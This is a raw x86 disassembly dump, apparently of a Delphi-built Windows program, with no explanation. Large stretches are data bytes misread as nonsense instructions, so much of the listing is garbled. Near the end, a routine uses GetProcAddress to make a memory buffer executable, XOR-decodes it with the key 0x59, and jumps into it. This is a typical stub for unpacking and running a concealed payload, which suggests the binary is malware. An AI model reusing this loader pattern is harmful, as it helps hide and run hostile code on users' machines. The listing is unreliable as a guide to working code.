add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0049 ] al
outsb
push ebx
je r-xdata
add [ eax ] al
or [ eax ] 0x9
dec ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
popad
je r-xdata
add [ ecx + r-xdata ] esp
inc esp
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x50 ] bp
pop [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ecx ] cl
insd
mov al 0x8f
inc ebx
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09003e ] al
push sub_47a838
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
jb r-xdata
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
nop
xor al [ eax ]
sbb [ ebx + eax * 2 + 0x68 ] dl
arpl [ gs : ebx + 0x4c ] bp
inc eax
jb r-xdata
cmpsd [ esi ] [ edi ]
push ebp
dec edi
outsb
dec ebp
outsd
jne r-xdata
dec eax
add [ ecx ] cl
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
add eax 0x3
popad
lea eax [ bx + si ]
pushfd
cmpsd [ esi ] [ edi ]
inc edi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0xc0047 ] bl
outsb
push ebx
je r-xdata
call sub_4220b0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a831
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423198
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ecx
mov dl 0x1
mov eax [ r-xdata ]
imul esi [ ebx + 0x74 ] 0x44786f42
add [ eax + 0x18004032 ] dl
push esp
inc ebx
push 0x4c6b6365
inc esp
outsd
sub_47a7b8
push ebp
mov ebp esp
push ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47a831
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7ff7
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_423198
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x2c ]
test eax eax
jns r-xdata
sar eax 0x2
mov [ rw-data ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov ecx 0x3
cdq
idiv ecx
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47a838
mov eax [ ebp - 0x4 ]
call sub_4032a0
retn
add eax 0x3
sub_47a860
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4354fc
mov [ esi + 0x281 ] 0x1
mov [ esi + 0x294 ] 0xff000017
mov [ esi + 0x298 ] 0xff000018
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_47a8b0
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x290 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4355e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_47a8e0
push ebx
push esi
push edi
push ebp
push ecx
mov ebx eax
mov eax ebx
call sub_4360b4
mov eax [ ebx + 0x290 ]
test eax eax
je r-xdata
mov eax ebx
call sub_47aa00
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
lea eax [ ebx + 0x290 ]
call sub_40d01c
inc eax
mov [ esp ] eax
xor esi esi
mov edx esi
mov eax ebx
call sub_47b184
mov edi eax
mov edx esi
mov eax [ ebx + 0x290 ]
call sub_413de4
mov ebp eax
mov eax ebp
call sub_47a850
mov [ edi + 0x8 ] al
mov eax ebp
call sub_47a854
mov [ edi + 0x9 ] al
inc esi
dec [ esp ]
jne r-xdata
sub_47a954
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_436184
pop edi
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebx + 0x290 ] eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
mov edx esi
mov eax ebx
call sub_47af70
xor al 0x1
push eax
mov edx esi
mov eax ebx
call sub_47af9c
pop edx
call sub_47a83c
mov edx eax
mov eax [ ebx + 0x290 ]
call sub_413c88
inc esi
dec edi
jne r-xdata
sub_47aa00
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x238 ] 0x0
jne r-xdata
mov edx [ ebx + 0x68 ]
mov eax [ ebx + 0x228 ]
call sub_41e3e0
mov edx r-xdata
mov eax [ ebx + 0x228 ]
call sub_41e33c
mov esi eax
mov [ ebx + 0x284 ] esi
push esi
xor ecx ecx
mov edx 0x1a0
mov eax ebx
call sub_43efc4
sub_47aa53
inc [ edx ]
add [ eax ] al
add [ edi + 0x67 ] dl
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47a9e0
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp edi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x238 ] 0x0
jne r-xdata
push edi
lea esi [ ebp - 0x24 ]
lea edi [ ebp - 0x34 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43653c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x252 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47af70
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x250 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x254 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x250 ] edx
mov [ eax + 0x254 ] edx
xor eax eax
push ebp
push sub_47abe2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x24 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_43653c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x250 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x254 ] edx
retn
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47b344
test al al
jne r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x294 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
call sub_41d400
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x298 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x14 ]
call sub_41dbec
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0xc ]
mov edx 0xff000011
call sub_41d400
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x34 ] eax
add eax [ ebp - 0x14 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x2c ] eax
sub eax [ ebp - 0x14 ]
mov [ ebp - 0x34 ] eax
jmp r-xdata
test bl bl
jne r-xdata
push ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_47af9c
mov ecx eax
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_47ac60
jmp r-xdata
sub_47ac04
push ebx
push esi
push edi
push ebp
mov ebp edx
mov ebx eax
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ ebp + 0x8 ]
mov edx [ edi + 0x8 ]
mov eax ebx
call sub_47b344
test al al
jne r-xdata
mov edx ebp
mov eax ebx
call sub_436678
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax ebx
call sub_47a9e0
sub [ edi + 0x24 ] eax
mov eax ebx
call sub_47a9e0
add [ edi + 0x1c ] eax
jmp r-xdata
sub_47ac60
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x1 ] cl
mov esi eax
xor edi edi
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
add edx eax
mov [ ebp - 0x30 ] edx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x1c ]
sub edx eax
sub edx [ rw-data ]
sar edx 0x1
jns r-xdata
adc edx 0x0
add edx eax
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x30 ]
add eax [ rw-data ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x2c ]
add eax [ rw-data ]
mov [ ebp - 0x24 ] eax
mov ebx [ esi + 0x228 ]
cmp [ esi + 0x281 ] 0x0
je r-xdata
adc edx 0x0
call sub_42c584
call sub_42c664
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateRectRgn
mov edi eax
push edi
mov eax ebx
call sub_41e4e4
push eax
call GetClipRgn
mov eax [ ebp - 0x24 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x28 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x2c ]
add eax 0x2
push eax
mov eax [ ebp - 0x30 ]
add eax 0x2
push eax
call CreateRectRgn
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
push eax
mov eax ebx
call sub_41e4e4
push eax
call SelectClipRgn
mov eax [ ebp - 0x10 ]
push eax
call DeleteObject
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
mov al [ ebp - 0x1 ]
sub al 0x1
jb r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x8 ] 0x408
mov [ ebp - 0x8 ] 0x400
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0x12
call sub_42c8c8
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0xf
call sub_42c8c8
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x4
lea eax [ ebp - 0x30 ]
push eax
mov eax ebx
call sub_41e4e4
push eax
call DrawFrameControl
or [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x20 ]
push eax
push 0x0
mov eax ebx
call sub_41e4e4
push eax
call sub_42c584
lea ecx [ ebp - 0x3c ]
pop edx
call sub_42c770
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0x1a
call sub_42c8c8
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0x17
call sub_42c8c8
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0x16
call sub_42c8c8
jmp r-xdata
call sub_42c584
lea ecx [ ebp - 0x3c ]
mov dl 0x13
call sub_42c8c8
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push edi
mov eax ebx
call sub_41e4e4
push eax
call SelectClipRgn
push edi
call DeleteObject
mov eax [ ebx + 0x14 ]
call sub_41dd00
mov [ ebp - 0x9 ] al
mov eax [ ebx + 0x14 ]
call sub_41dbe4
mov esi eax
mov eax [ ebx + 0x10 ]
call sub_41d8e4
mov edi eax
mov dl 0x1
mov eax [ ebx + 0x14 ]
call sub_41dd08
mov edx 0xff000010
mov eax [ ebx + 0x10 ]
call sub_41d8ec
mov eax [ ebp - 0x28 ]
dec eax
push eax
mov eax [ ebp - 0x24 ]
dec eax
push eax
mov ecx [ ebp - 0x2c ]
inc ecx
mov edx [ ebp - 0x30 ]
inc edx
mov eax ebx
call sub_41e100
mov dl [ ebp - 0x9 ]
mov eax [ ebx + 0x14 ]
call sub_41dd08
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41dbec
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_41d8ec
cmp [ esi + 0x281 ] 0x0
je r-xdata
sub_47aebc
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_47af9c
cmp bl al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
call sub_47b184
mov [ eax + 0x8 ] bl
mov edx esi
mov eax edi
call sub_47aeec
sub_47aeec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b344
test al al
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov ecx esp
mov edx esi
mov eax ebx
call sub_435f38
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
mov eax ebx
call sub_47a9e0
mov edx [ esp + 0x8 ]
sub edx eax
mov [ esp ] edx
mov eax ebx
call sub_47a9e0
add eax [ esp ]
mov [ esp + 0x8 ] eax
jmp r-xdata
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4445f8
push eax
call InvalidateRect
mov eax ebx
call sub_4445f8
push eax
call UpdateWindow
sub_47af70
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b238
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b184
mov al [ eax + 0x9 ]
xor al 0x1
pop esi
pop ebx
retn
sub_47af9c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b238
test al al
je r-xdata
mov eax [ r-xdata ]
call sub_47a85c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b184
mov al [ eax + 0x8 ]
pop esi
pop ebx
retn
sub_47afcc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi ] 0x20
jne r-xdata
mov edx esi
mov eax ebx
call sub_4368ac
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax ebx
call sub_47b0cc
sub_47aff8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x2 ] cl
mov [ ebp - 0x1 ] dl
mov ebx eax
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
push edi
push esi
mov cl [ ebp - 0x2 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f3d8
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax edi
call sub_412988
lea edx [ ebp - 0x10 ]
mov cl 0x1
mov eax ebx
call sub_435eac
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47af70
test al al
je r-xdata
mov eax ebx
mov si 0xffc8
call sub_40349c
test al al
jne r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_435f38
mov esi [ ebp - 0x18 ]
mov eax ebx
call sub_47a9e0
sub esi eax
sub edi esi
test edi edi
jle r-xdata
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_435f38
sub edi [ ebp - 0x20 ]
mov eax ebx
call sub_47a9e0
cmp edi eax
jge r-xdata
mov eax ebx
call sub_47a9e0
cmp edi eax
jge r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b0cc
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_47b0cc
sub_47b0cc
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp esi eax
jge r-xdata
mov edx esi
mov eax ebx
call sub_47af70
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_47af9c
mov edx eax
sub dl 0x1
jb r-xdata
cmp [ ebx + 0x280 ] 0x0
je r-xdata
je r-xdata
mov al 0x1
jmp r-xdata
mov al 0x2
jmp r-xdata
xor eax eax
jmp r-xdata
dec dl
je r-xdata
mov ecx eax
mov edx esi
mov eax ebx
call sub_47aebc
mov eax ebx
mov si 0xffad
call sub_40349c
mov al 0x1
jmp r-xdata
sub_47b15c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
mov edx esi
mov eax ebx
call sub_47b238
test al al
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b184
mov edi [ eax + 0x4 ]
sub_47b184
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b1a4
test eax eax
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b210
sub_47b1a4
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4356b4
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
je r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_403a2c
mov eax ebx
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
jne r-xdata
xor ebx ebx
sub_47b210
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov ecx esi
mov edx edi
mov eax ebx
call sub_4356d4
mov eax esi
pop edi
pop esi
pop ebx
retn
sub_47b250
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b238
test al al
jne r-xdata
mov edx esi
mov eax ebx
call sub_47b184
mov [ eax + 0x4 ] edi
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_47b27c
push ebx
push esi
push edi
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
call sub_435730
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_47b184
call sub_4032a0
mov edx ebx
mov eax edi
call sub_47b238
test al al
je r-xdata
sub_47b2c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b238
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_435710
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b184
call sub_4032a0
sub_47b304
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x218 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx ebp
mov eax edi
call sub_44384c
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_47b1a4
call sub_4032a0
inc esi
dec ebx
jne r-xdata
sub_47b344
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47b238
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_47b184
mov al [ eax + 0xa ]
pop esi
pop ebx
retn
sub_47b394
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039f4#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47b3c0
retn
sub_47b3e5
mov dh 0x47
add [ esi * 4 + 0x47 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp al 0xb6
inc edi
add [ eax ] bh
add eax [ eax ]
add [ eax + 0x5400453a ] cl
test al 0x41
add [ eax + ebp * 2 ] ch
inc ebp
add al ah
imul eax [ ebp ] sub_4034fc
dec esp
mov es [ ebp ]
cmp [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] dl
add [ eax + 0x6a ] cl
inc ebp
add [ eax ] dl
push ecx
inc esp
add [ eax + 0x3400456f ] bh
inc esp
inc ecx
add [ eax ] cl
insb
inc ebp
add [ esp + ebp * 2 + 0x45 ] al
add [ eax + 0x6d ] dl
inc ebp
add al ah
fild [ ebx ]
insb
test al 0x41
add al cl
jne r-xdata
nop
jne r-xdata
add [ ebp + 0x41 ] cl
add [ eax - 0x4f ] ch
inc ebp
add [ eax + 0x24004566 ] ah
dec esp
inc esp
add [ eax + 0x51 ] al
inc esp
add [ eax + edx * 2 - 0x2ec3ffbc ] cl
inc ebx
add [ eax - 0x57ffbbba ] ah
jb r-xdata
xchg esp eax
sbb [ eax + eax + 0xc ] eax
inc esi
add [ esp + esi * 2 + 0x45 ] bl
jl r-xdata
mov al [ 0xffffffffac004565 ]
add al bl
inc ebx
inc esp
add [ eax + edx * 8 - 0x2f77ffbd ] al
inc ebx
add [ ebx + esi * 2 + 0xc80045 ] bl
inc esp
add al cl
fild [ ebx ]
add dl dl
inc ebx
add [ ebp + ebx * 8 + 0x43 ] dl
add [ eax + 0x5c004575 ] dl
je r-xdata
or al 0x53
jo r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ edx ] dl
inc ecx
jo r-xdata
test al 0x6b
inc ebp
add al dh
lodsd [ esi ]
inc ebp
add [ eax + ebp * 2 + 0x45 ] ah
add ah dh
test al 0x45
add ah dl
pop [ ebp ]
test al 0xaa
inc ebp
add [ ebp + esi * 2 + 0x100045 ] cl
inc ebx
mov dh 0x47
add al bh
add al [ eax ]
add [ eax ] al
add [ 0x63656843 ] cl
imul ecx [ ecx + ebp * 2 + 0x73 ] 0x74
inc edx
outsd
js r-xdata
add [ eax + 0x7000441a ] bl
mov [ ebp ] eax
ror [ ebp + eax * 2 + 0x458b8c00 ] 0x1
add [ eax ] dh
sbb eax [ eax + eax + 0x34 ]
sbb eax [ eax + eax + 0x8 ]
mov es [ ebp ]
inc esp
add ah bh
xchg esp eax
inc ebp
add [ eax ] al
pop eax
inc esp
add [ eax + 0x10004442 ] cl
stosb [ edi ]
inc ebp
add [ edi + ebx * 2 + 0x62440045 ] dl
inc ebp
add al dh
0x6b2c0045 0x45
or al 0x46
add [ esi + ebx * 8 + 0x76080043 ] cl
inc ebp
add [ ecx + eax + 0x44 ] cl
add [ esp + eax * 2 ] ch
inc esp
add al ch
inc esp
inc esp
add ah ah
aas
inc esp
add ah cl
inc esp
inc esp
add [ eax - 0x53ffba9b ] ah
jb r-xdata
inc edx
jne r-xdata
xor [ eax ] ebx
add eax [ eax ]
add [ eax ] cl
add [ ecx ] cl
inc ebx
outsd
insb
imul esp [ ebx + 0x61 ] 0x6e6f6974
inc ebp
jbe r-xdata
jb r-xdata
and [ ebx ] al
add [ eax ] al
or al [ eax ]
or edx [ edx + 0x61 ]
imul ebp [ fs : edi + 0x47 ] 0x70756f72
add [ eax ] al
and al 0x3
je r-xdata
imul esi [ ebx + 0x74 ] 0x32831
add [ eax + eax ] cl
or al [ ebx + 0x6f ]
insb
outsd
jb r-xdata
sbb al 0x3
add [ eax ] al
or [ eax ] eax
outsb
je r-xdata
loope r-xdata
xor [ fs : ebx + eax ] ebp
add [ eax ] al
or eax 0x64440e00
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6e6f4374
jbe r-xdata
add ah bh
outsd
jne r-xdata
outsb
xor [ eax ] ecx
add eax [ eax ]
add [ eax + eax ] al
or edx [ ebx + 0x74 ]
jb r-xdata
xor [ eax ] edx
add [ esp + ebx * 4 + 0x47 ] dh
inc ebx
push eax
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x54063174
inc esi
outsd
jb r-xdata
insb
insb
inc edx
popad
xor [ eax ] eax
add eax [ eax ]
add [ edx ] al
add [ ebx ] cl
push ebx
je r-xdata
in al dx
add [ eax + eax ] bh
inc ebx
add [ eax + 0x7c ] cl
inc edx
je r-xdata
xor [ ebx ] al
add edx [ ebp - 0xc ]
mov [ edx ] al
nop
nop
inc [ ebp - 0xc ]
cmp [ ebp - 0xc ] 0x5bba
jne r-xdata
add esp 0xffffffec
nop
xor [ eax ] esp
mov ah 0x47
add al dl
cmp eax [ ebp ]
pop esi
add [ 0x74696e55 ] al
cdq
inc edx
add ah ah
or al 0x47
add [ eax + edx * 8 - 0x2d87ffbc ] cl
inc edx
add [ ebp + ebp * 8 - 0x1e77ffbe ] dl
inc edx
inc edi
add [ eax - 0x3ffbcf8 ] ch
xor [ ebx + eax ] esp
or eax [ eax ]
or eax [ ecx + 0x63 ]
outsb
inc edi
jb r-xdata
nop
cmp [ ebp + 0x8 ] 0x0
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
je r-xdata
push r-xdata
call sub_47b6a8
leave
leave
leave
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
mov [ ebp - 0x8 ] eax
nop
nop
nop
lea eax [ ebp - 0x10 ]
push eax
push 0x40
push 0x5bb9
mov eax [ ebp + 0x8 ]
push eax
call [ ebp - 0x8 ]
nop
nop
xor eax eax
mov [ ebp - 0xc ] eax
outsb
dec esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
add al bh
mov al [ edi ]
test al 0x8
inc ebx
inc edi
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
sar [ ebx ] 0x1
inc ebp
add [ esi ] bl
add eax 0x74696e55
jb r-xdata
nop
mov eax [ ebp + 0x8 ]
add eax [ ebp - 0xc ]
mov al [ eax ]
mov [ ebp - 0x11 ] al
mov al [ ebp - 0x11 ]
xor al 0x59
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
add eax 0x1ec8
mov [ ebp - 0x4 ] eax
jmp [ ebp - 0x4 ]
je r-xdata
xor [ fs : ebx + eax ] ecx
add [ eax ] al
add eax 0x614d0900
imul ebp [ esi + 0x4d ] 0x31756e65
add [ ecx ] cl
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
arpl [ ebp + 0x78 ] dx
je r-xdata
push cs
pop ecx
leave
leave
or [ eax + 0x595949e6 ] esi
leave
leave
leave
leave
aas
ror [ edi + ecx * 4 ] 0x1
mov al 0x61
outsb
pop ecx
pop ecx
leave
leave
leave
leave
leave
aam 0xdc
and [ esi + 0x6a2db1a6 ] esp
pop ecx
pop ecx
aam 0x1c
test [ eax + 0x595914cb ] esi
push cs
rcr [ edi ] 0x1
jne r-xdata
jl r-xdata
je r-xdata
add [ esi ] cl
inc esp
push ebx
jb r-xdata
je r-xdata
outsb
jne r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
leave
leave
leave
leave
leave
leave
cmpsb [ esi ] [ edi ]
andnps xmm6 [ eax + 0x59597aba ]
leave
leave
leave
leave
leave
leave
leave
push esi
out dx al
pop ds
dec ebp
mov al 0x76
jg r-xdata
push esi
ja r-xdata
je r-xdata
